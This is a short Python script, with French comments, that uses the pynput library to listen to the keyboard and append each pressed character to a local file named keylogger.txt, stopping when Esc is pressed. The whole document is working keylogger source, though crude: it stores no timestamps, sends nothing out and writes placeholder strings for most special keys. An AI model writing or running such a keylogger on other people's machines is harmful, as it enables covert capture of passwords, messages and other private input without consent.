from pynput import keyboard

def pression(key):
    """enregistre la touche pressee dans le fichier"""

    try:
        with open("keylogger.txt","a") as f:
            f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogger.txt","a") as f:
                f.write("keyboard.Key.space")
        else:
            with open("keylogger.txt","a") as f:
                f.write("key")
def relachement(key):
    """sort du programme avec une touche speciale"""

    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=pression,on_release=relachement) as l:
        l.join()





